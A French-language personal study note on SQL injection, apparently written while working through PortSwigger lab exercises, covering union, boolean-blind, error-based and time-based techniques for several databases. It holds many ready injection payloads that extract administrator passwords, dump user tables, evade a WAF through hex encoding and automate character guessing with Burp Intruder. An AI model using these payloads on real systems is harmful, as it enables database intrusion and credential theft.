[https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet "https://portswigger.net/web-security/sql-injection/cheat-sheet")

**In-band** : On voit le résultat de notre payload directement sur notre session.

**error-based sqli** : On provoque délibérément des erreurs afin de comprendre comment fonctionne le server et d'en tirer conclusion.

**union-based sqli** : C'est pour récupérer des données du tableaux de la db. On dit union-based car on utilise la clause UNION de sql.

**blind** :     On ne voit pas le résultat sur notre sessions mais on peut essayer d'interpreter les erreurs ou les timing.

**boolean-based** : On pose une question, si la réponse est true, on aura une réponse, si c'est false, on a aucune réponse. Si par exemple on demande si le premier caractère du mot de passe de l'user admin est s, si y'a pas de réponse c'est faux mais si y'a une réponse c'est vrai. On peut donc faire ca avec tout les caractère suivants.

**Time-based** : Comme pour les boolean, on a deux réponse possible. On va poser une question (est ce que la premier lettre du mot de passe de l'admin c'est un e par exemple), on demande au server d'attendre 10s par exemple. Donc si c'est vrai, la page chargera après 10s. Dans le cas contraire, ca prendra 1s.

**out-band** :  On n'a pas trop de visibilité sur les résultat donc on décide d'utiliser des payload qui redirige une output externe donc vers un server qu'on possede ou un truc dans le genre.

---

## Exploitation :  
#### Tips un peu random :  
###### Commentaire :

```
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

###### Connaitre la version de la db :  
Database type                      Query  
Microsoft, MySQL                SELECT @@version  
Oracle                                       SELECT * FROM v$version  
PostgreSQL                             SELECT version()

###### Time delay :  
Oracle  
`dbms_pipe.receive_message(('a'),10)`  

Microsoft  
`WAITFOR DELAY '0:0:10'`

PostgreSQL  
`SELECT pg_sleep(10)`  

MySQL  
`SELECT SLEEP(10)`  


###### Conditional time delay :  
Oracle
`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual`

Microsoft  
`IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'`  

PostgreSQL  
`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END`

MySQL  
`SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')`

**Symbole || concaténation** : Injection : `TrackingId=x'||pg_sleep(10)--` Le || entre le cookie et pg_sleep est très important, sans lui l'injection ne marche pas. En gros, le || sert à inclure pg_sleep dans la requête sql. Donc si le cookie est valide, alors pg_sleep va s'executer. Faut voir || comme un mix entre l'inclusion et un "alors". Si le cookie est valide ALORS pg_sleep. C'est pas hyper logique comme symbole dans cette utilisation donc fie toi vraiment à ma def.

in-band :  
Connaitre le nombre de colonnes :  
union-based :

**ORDER BY** : requête de base : `SELECT name, email FROM users WHERE id = '1';` Pour connaitre le nombre de colonne on va utiliser la clause ORDER BY. Cette clause sert à trier les données en fonction d'une colonne. Nous on s'en fout un peu, ce qu'on cherche à savoir c'est est ce que la fonction peut être réalisé. Injection : `1' order by 1--` Là on demande de trier le tableau en fonction de la colonne 1. Si on incrémente a chaque fois le numéro de colonne, on compte alors combien y'en a. Donc on répète en incrémentant jusqu'a ce qu'il retourne une erreur ou un truc dans le genre.

**NULL** : requête de base : `SELECT name, email FROM users WHERE id = '1';` Là on va utiliser NULL. C'est le meme principe sauf que la syntaxe est différente. Injection : `1' UNION SELECT NULL--` temps qu'on a pas d'erreur, on augmente le nombre de null comme ca : `1' UNION SELECT NULL,NULL--`.

###### Oracle :

**v\$version** : Si par exemple la requête de base demande deux colonnes, au lieu de faire `UNION SELECT banner FROM v\$version` ou `UNION SELECT * FROM v\$version`, on peut faire `UNION SELECT banner, NULL FROM v$version`.

**dual** : Injection : `' UNION SELECT NULL FROM DUAL--` C'est  pour retrouver le nombre de colonne du tableau

###### Connaitre le type de data de la colonne :  
union-based :

dual : Injection : `' UNION SELECT NULL FROM DUAL--` C'est  pour retrouver le nombre de colonne du tableau

n type ou pas. Injection 1 : `1' UNION SELECT 'a', NULL--` Si on a une erreur, le data type de la colonne n'est pas string. Et on test avec tout les types de données pour la colonne. Pour la deuxieme colonne, meme processus donc l'injection ressemblerai à Injection 2 : `1' UNION SELECT NULL, 'a'--`

###### Voir le nom des tableaux :

**Information_schema_tables** : On peut utiliser une clause UNION. Injection : `' UNION SELECT table_name FROM information_schema_tables--`

###### Voir le nom des colonnes d'un tableau :

Pour Microsoft, Mysql : Injection : `'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='nom_du_tableau'--` et après avoir trouver le nom des colonnes, on peut voir ce qu'il y a dedans.

Pour Oracle : Injection : `' UNION SELECT table_name FROM all_tables--` Ensuite, pour voir le nom des colonnes du tableau qu'on a trouvé Injection : `' UNION SELECT column_name,NULL FROM all_tab_name WHERE table_name = 'USERS'--` mettre le nom du tableau a la place de users évidemment. Ensuite pour récupérer les données des colonnes qu'on a trouvé c'est simple : Injection : `' UNION SELECT username,password FROM USERS--`

###### Extraire des données :

Basique : requête de base : `SELECT name, email FROM users WHERE id = '1';` Là on joue juste avec un UNION SELECT, y'a rien de compliqué dans cette injection mais c'est pour ca qu'elle ne marche évidemment jamais en condition réel car trop simple sinon. Injection : 1' UNION SELECT name, email FROM users; on chope tout dans la colonne name et email.

Encode + concaténation : Imaginons qu'on est face à un waf qui detecte les injections sql, dans burp suite, on peut utiliser hackvertor qui sert à encoder (en hex_entities dans mon exemple) et éviter la détection. IMPORTANT : **dans une injections sql, quand ce qu'on doit passer à la base (un id par exemple) est dans le tableau, donc en tant que valeur, on met une apostrophe simple pour ajouté des trucs après. Quand c'est le nom d'une colonne le paramètre de base, on ne met pas d'apostrophe simple.** Dans mon exemple, le paramètre de base demande le numéro de colonne (ca pourrait être un nom à la place). On a découvert (grace à d'autre injections comme 1 UNION SELECT NULL) que la requete de base demande une valeur de seulement une colonne. Sachant que : **avec UNION, les deux requête doivent demander le même nombre de colonne**, notre requête devra demander qu'une seule colonne. Sauf que nous on veut les username et password (deux colonne différente). On va donc concaténer les deux colonnes. On va utiliser `|| '~' ||`, les deux || servent d'opérateur pour indiquer qu'on veut concaténer deux colonne. Le ~ c'est ce qui va séparer les deux valeurs (on peut mettre ce qu'on veut). Autour des opérateur, on va mettre le nom des colonnes comme ca : username `|| '~' ||` password. Notre injection sql final ressemblera à Injection 1 : `<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>` Maintenant imaginons que la requete de base demande 2 colonne mais la première demande des valeurs int par exemple, on devra faire la concaténation pour la seconde colonne donc Injection 2 : `<@hex_entities> UNION SELECT NULL, username || '~' || password FROM users--<@/hex_entities>` (les petites différences entre les deux injections c'est juste que ca provient de deux sources différentes)

---

###### blind :  
Boolean-based

**Vérifier qu'il y a bien un tableau spécifique** : Injection : `TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a` Imaginons qu'on ai une injection sql à faire dans un cookie (trackingid dans ce cas), on va dire que mon propre cookie c'est xyz (ca peut être n'importe quoi mais il faut qu'il soit valide donc on peut prendre le sien). Ce qu'il y a entre parenthèse demande si le tableau users existe. Si oui, la sous-requete renverra a (valeur arbitraire). Ensuite, on compare la valeur retourné avec le a. Si on trouve une table users, on a a=a donc si on a une réponse différente quand on met a=b ou a=a, c'est qu'il y a une table users.

**Véfifier si une valeur est dans un tableau** : Injection : `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a` Même principe que juste au dessus, là c'est juste qu'on vise un username.

**Déterminer la longueur d'une valeur d'un tableau**: Injection : `TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a` Toujours plus ou moins le même principe, sauf que la on doit incrémenter la longueur de password. Temps qu'on a pas d'erreur, on continue d'incrémenter. Imaginons que le password fais 5 caractère, quand on fera ...>5, on aura une erreur.

**Déterminer chaque caractère d'une valeur** : Injection : `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` Encore une fois le même principe sauf que là, on va utiliser burpsuite intruder pour être plus rapide. La logique de l'injection est simple, on prend grace a substring le premier caractère de la valeur (le premier 1, celui qu'on va incrémenter après) de taille 1 caractère (le deuxième 1). Ensuite, on va comparer le caractère reçu avec 'a' par exemple. Si c'est le bon, on aura une réponse valide dans la page, sinon, on aura une erreur ou un truc qui change sur la page. Tu peux essayer 3 valeur (si t'as deux réponse différente) et voir laquelle est différente des autres. Sauf que c'est chiant donc on va utiliser burpsuite intruder. On ajoute le 'a' dans le point d'injection, dans payload-> payload setting et on ajoute de a-z, A-Z et 0-9 dans la list. (type de payload simple list). Ensuite IMPORTANT : va dans settings, grep match, puis tu ajoute ce qui change dans la page quand y'a une bonne réponse ou pas. Dans mon exemple, on avait welcome back quand on avait une requête correct donc je l'ai ajouté. Puis on lance l'attaque et on regarde (tous a droite du tableau) si ce qu'on a ajouté est marqué ou non. Puis on recommence pour chaque indice de caractère.

![Screenshot_2023-09-01_11_17_31.png](file:///home/wpkaliuser/.config/joplin-desktop/resources/ee5e2ee46ab5311011da58a01b7f8975.png)  
Error-based :  
Microsoft, MySQL :  
**Déterminer si y'a une error-based injection possible :**
Injection : `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`  Génère la page normalement. On regarde si la condition 1=2 est vraie. Si oui, on génère une erreur car 1/0 c'est pas possible. Sinon, on génère la page normalement car 'a'='a'.
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`  Génère une erreur. Le END c'est juste pour spécifier la fin de l'utilisation de CASE.
Ca permet de voir les réponse de ce qu'on demande. On pourra s'en servir comme pour les injections boolean-based pour vérifier des données.

**Déterminer les caractère d'une valeur d'un tableau** : Injection : `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a` cette injection est de même logique. On utilise case pour tester une condition. On récupère le premier caractère de la valeur password qui est sur la même ligne que la case qui a administrator dans la colonne username. Si ce caractère est supérieur à m, alors le site rendra une erreur car impossible de diviser par 0 (then 1/0), si la condition est fausse (le caractère ciblé est inférieur à m), alors la page se chargera normalement car la selection rendra 'a' et donc la ligne contiendra 'a'='a' ce qui est vrai. IMPORTANT : Quand on fait des injections error-based, dès qu'on a une erreur, c'est que la condition est vraie. On peut ajouter || autour de la requete pour concatener le cookie avec la valeur retourné.

**CAST** : Sert à convertir un type de data en un autre. Le truc c'est qu'on peut pas convertir un string en int (normal) donc quand on essaye dans une injection sql, bah y'a une erreur. Injection : `CAST((SELECT example_column FROM example_table) AS int)` Si on fait ca sur une colonne qui est censé contenir du texte, on a une erreur comme par exemple :

**ERROR** : invalid input syntax for type integer: "Example data". Là dans ce cas c'est vachement explicite on voit carrément la donnée qu'on veut, mais en vrai, on pourrait peut être voir des info sympa.

###### Oracle :  
**Déterminer si y'a une error-based injection possible :**
Injection : `xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` Avec oracle, les select doivent toujours fait référence à une table. C'est pour ca qu'on met dual. Faut aussi faire avec 1=2

**Déterminer la longueur d'une valeur d'un tableau :**
Injection : `xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` La position de username='administrator' c'est dûe à la syntaxe de Oracle. C'est logique comme ca mais c'est pas du tout la même syntaxe que Microsoft sql server ou MySQL. Bref, encore le même principe de condition, si le password est plus grand que la valeur à incrémenté, on a une erreur. Quand on ne reçois plus d'erreur, le password est de la longueur de la valeur qu'on à mit dans l'injection car on met > et pas >=.

**Déterminer les caractère d'une valeur d'un tableau :**
Injection : `xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` Pareil pour la position de username bla bla. Note qu'on utilise SUBSTR à la place de SUBSTRING. IMPORTANT : Les || (concaténation) autour c'est spécial. En gros quand la condition est vrai (retourne une erreur), on s'en fout car même sans les ||, on a une erreur (faut quand même les mettres sinon t'aura toujours une erreur et ca servirai a rien). Par contre quand l'info est fausse, (charge la page) on doit concaténer le '' après le ELSE car si y'a encore une valeur après le cookie, t'aura une erreur. Donc la faut concaténer le cookie avec '' (vide). Et faut le mettre au deux extrémité (je sais pas pourquoi, fais des recherche si t'as envie). Faut penser que cette injection, tu la fera dans burpsuite intruder. Par contre, à la différence des injections Boolean-based, on joue avec les erreurs donc y'aura pas besoin de mettre de valeurs dans grep-match, faudra juste regarder la colonne erreur.

**Déterminer si une valeur est dans un tableau :**
Injection : `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'` (syntaxe pour Oracle mais c'est pareil pour les autres types de db) Toujours la même logique, si administrator est trouvé, on reçoit une erreur.

###### PostgreSQL :
**Déterminer si une valeur est dans un tableau grâce à pg_sleep** : Injection : `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` Vérifie si administrator est dans la colonne username. Si oui, on met une pause de 10s, sinon, la page charge normalement.

**Déterminer la longueur d'une valeur** : Injection : `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` On compare la longueur du password, sur la même ligne que la case qui contient administrator dans la colonne username, à 1. S'il est plus grand, on attend 10s pour charger la page, sinon elle charge normalement donc on continue d'incrémenter le 1.

**Déterminer les caractère d'une valeur** : Injection : `TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--` Comme d'hab, on utilise SUBSTRING (car PostgreSQL), si le caractère correspond, 10s de pause, sinon y'a rien donc on change de caractère. Pour changer de caractère dans burpsuite intruder : ajoute 'a' dans le point de source. Ajoute a-z, A-Z, 0-9 dans les payloads settings. Dans resource pool, créer un nouveau resource pool en bas, le nom on s'en fout, tu coche maximum concurrent request et tu met à 1. C'est en fait le nombre de requête simultané qu'on va faire mais nous on a besoin de connaitre les timing donc faut mettre 1 par 1. Ensuite, tu lance l'attaque et dans la section column, tu clique sur response received pour voir le temps que met chaque requête à se finaliser.

---

out-band :

